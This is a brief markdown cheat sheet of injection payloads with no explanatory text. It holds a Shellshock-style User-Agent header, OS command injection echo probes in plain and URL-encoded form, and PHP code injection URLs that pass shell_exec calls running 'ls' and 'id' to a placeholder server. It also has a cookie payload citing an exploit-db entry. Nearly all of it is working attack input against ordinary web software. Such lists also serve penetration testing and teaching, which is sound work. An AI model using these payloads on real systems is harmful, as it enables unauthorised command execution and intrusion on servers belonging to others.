Header Injection
=========================
```
User-Agent: () { :;}; /bin/sleep 0
```

OS Command Injection
=========================
Echo
-------
```
|echo dadzo62ztj 01lnotnbq8||a #' |echo dadzo62ztj 01lnotnbq8||a #|" |echo dadzo62ztj 01lnotnbq8||a #
%7cecho%20dadzo62ztj%2001lnotnbq8%7c%7ca%20%23'%20%7cecho%20dadzo62ztj%2001lnotnbq8%7c%7ca%20%23%7c%22%20%7cecho%20dadzo62ztj%2001lnotnbq8%7c%7ca%20%23
```
Source Code Injection
==========================

PHP Code Injection Examples
---------------------------
```php
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('ls%20-al%20/etc/apache2')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('ls%20-al%20/etc/')}}

http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker%7b$%7bshell_exec('id')%7d%7d
http://xxx.xxx.xxx.xxx/codeexec/example1.php?name=hacker{${shell_exec('id')}}

# https://www.exploit-db.com/exploits/46276
Cookie: CSRF-TOKEN=rnqvt{{shell_exec('ls -lah')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
```
